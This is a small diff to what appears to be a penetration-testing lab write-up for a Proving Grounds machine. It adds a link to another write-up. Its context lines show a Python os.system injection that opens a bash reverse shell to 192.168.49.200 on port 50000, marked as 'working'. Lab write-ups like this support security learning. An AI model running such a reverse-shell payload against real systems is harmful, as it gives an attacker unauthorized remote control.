@@ -27,6 +27,7 @@ def addition(a, b):
 __import__('os').system('bash -i >& /dev/tcp/192.168.49.200/50000 0>&1')#
 __import__('os').system('bash -i >& /dev/tcp/192.168.49.200/50000 0>&1') <--- working
 ```
+https://imtodess.gitbook.io/writeups/pg/get-to-work/linux/hetemit
 
 ### Foothold
 
